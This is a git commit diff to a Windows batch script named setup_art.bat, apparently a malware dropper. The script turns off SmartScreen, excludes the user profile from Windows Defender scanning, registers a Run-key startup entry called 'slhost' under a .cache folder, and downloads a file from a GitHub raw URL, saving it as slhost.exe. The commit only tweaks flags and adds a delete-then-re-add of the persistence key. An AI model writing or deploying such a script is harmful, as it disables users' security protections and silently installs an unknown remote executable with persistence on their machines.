80f8b6ccb7a8194b306ef25bf16d98c239968a92
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2024-01-15 05:24:23 -0300

    Update setup_art.bat

--- setup_art.bat
+++ setup_art.bat
@@ -1,8 +1,10 @@
 @echo off
 
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f /v EnableSmartScreen /t REG_DWORD /d 0
 powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
+REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost 
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  
+
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')"
